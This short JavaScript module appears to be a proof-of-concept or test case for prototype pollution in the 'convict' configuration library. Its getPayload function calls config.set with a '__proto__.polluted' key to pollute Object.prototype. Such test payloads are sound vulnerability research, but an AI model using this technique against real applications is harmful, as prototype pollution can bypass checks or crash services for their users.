function getPayload() {
    const convict = require("convict");
    let obj = {};
    const config = convict(obj);
    
    config.set("__proto__.polluted", "yes");

    return { config };
}

module.exports = { getPayload };